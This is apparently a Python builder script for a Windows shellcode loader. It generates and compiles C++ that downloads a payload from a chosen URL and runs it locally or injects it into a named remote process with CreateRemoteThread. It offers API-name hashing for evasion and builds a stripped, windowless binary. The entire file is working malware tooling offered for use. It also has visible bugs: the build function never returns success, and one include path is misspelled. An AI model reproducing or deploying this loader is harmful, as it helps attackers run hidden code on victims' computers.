import os
import time

def build (Enumeration, ProcessName, Loader, Url):
    f = open ("main.cpp", "a")
    f.write(f"""
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "Libraries/FetchFromURL.h"
""")   
    
    if Enumeration != "null":
        f.write(f"""\n
#include "Libraires/{Enumeration}"
""")
    else:
        pass


    f.write(f"""\n
#include "Libraries/{Loader}"

using namespace std;

int main()
{{
    PBYTE  pPayloadAddress;
    DWORD pPayloadSize;
    string Url  = "{Url}";
    LPWSTR szProcessName = L"{ProcessName}";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    
    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, &pPayloadSize)){{
        cout << "Failed to fetch payload" << endl;
        return 0;
    }}

    //Encrypt(pPayloadAddress, pPayloadSize, NULL, NULL);
    """)

    if Enumeration != "null":
        f.write(f"""\n
    if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess)){{
        cout << "Failed to find remote process" << endl;
        return 0;
    }}""" ) 
    else:
        pass

    f.write(f"""\n
    if(!PayloadExecute(hProcess, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, &hThread)){{
        cout << "Failed to execute payload" << endl;
        return 0;
    }}

    return 0;
}}
""")

    f.close()
    time.sleep(2)
    os.system(f"C:\\msys64\\mingw64\\bin\\g++ -O2 -s -o chungus main.cpp -lwininet -lws2_32 -mwindows")
    #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #print(result)

def change_header_file(Enumeration, Loader, ApiMode):
    try:
        with open(f"Libraries/{Enumeration}", "r") as file:
            content = file.read()
        content = content.replace('#include "api.h"', f'#include "{ApiMode}"')
        with open(f"Libraries/{Enumeration}", "w") as file:
            file.write(content)
    except:
        pass

    with open(f"Libraries/{Loader}", "r") as file:
        content = file.read()
    content = content.replace('#include "api.h"', f'#include "{ApiMode}"')
    with open(f"Libraries/{Loader}", "w") as file:
        file.write(content)

def restore_header_file(Enumeration, Loader, ApiMode):
    try:
        with open(f"Libraries/{Enumeration}", "r") as file:
            content = file.read()
        content = content.replace(f'#include "{ApiMode}"', '#include "api.h"')
        with open(f"Libraries/{Enumeration}", "w") as file:
            file.write(content)
    except:
        pass

    with open(f"Libraries/{Loader}", "r") as file:
        content = file.read()
    content = content.replace(f'#include "{ApiMode}"', '#include "api.h"')
    with open(f"Libraries/{Loader}", "w") as file:
        file.write(content)

def main():
    Url = input("""\nSet Payload Url or type local For localhost:8000 (test): 

    >> """)
    
    if Url == "local":
        Url = "http://localhost:8000/payload.bin"

    Loader = input("""\nEnter Injection Techinque: 
    1. Local Injection
    2. Remote Process Injection

    >> """)
 
    if Loader == "1":
        Loader = "LocalInjection.h"
        Enumeration = "null"
        ProcessName = "null"
    elif Loader == "2":
        Enumeration = input("""\nEnter Process/Thread Enumeration Techinque: 
    1. Enumeration via Snapshot

    >> """)
        if Enumeration == "1":
            Enumeration = "ProcessEnum32Snapshot.h"
            ProcessName = input("""\nEnter Target Process Name:
                                
    >> """)
            if ProcessName == "": 
                print("Invalid Input")
                exit()
        else:
            print("Invalid Input")
            exit()
        Loader = input("""\nEnter Injection Techinque:
    1. Remote Process Injection - (CreateRemoteThread)
                       
    >> """)
        if Loader == "1":
            Loader = "RemoteInjection.h"
                       
    else:
        print("Invalid Input")
        exit()
    
    ApiMode = input("""\nSelect API Hashing Mode:
    1. No Hashing
    2. Hashing (Rotr32)

    >> """)
    if ApiMode == "1":
        ApiMode = "ApiNoHash.h"
    elif ApiMode == "2":
        ApiMode = "ApiCtHash.h"
    
    change_header_file(Enumeration, Loader, ApiMode)

    if build(Enumeration, ProcessName, Loader, Url):
        print(f"\nPayload Built Successfully!\nHave Fun! :)")
    else:
        print(f"\nFailed to build payload :(")
    
    restore_header_file(Enumeration, Loader, ApiMode)


if __name__ == "__main__":
    main()
